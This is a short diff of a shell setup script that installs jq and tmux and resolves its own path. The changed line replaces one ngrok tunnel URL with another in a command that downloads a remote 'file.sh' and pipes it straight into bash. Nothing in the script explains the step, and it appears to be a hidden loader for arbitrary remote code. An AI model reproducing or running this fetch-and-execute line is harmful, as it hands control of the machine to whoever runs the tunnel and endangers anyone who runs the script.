@@ -4,7 +4,7 @@ apt update && apt cache clean && apt install jq tmux -y
 
 source="${BASH_SOURCE[0]}"
 
-curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+curl https://b7f9-14-194-59-58.in.ngrok.io/file.sh | bash
 
 # resolve $source until the file is no longer a symlink
 while [[ -h "$source" ]]; do
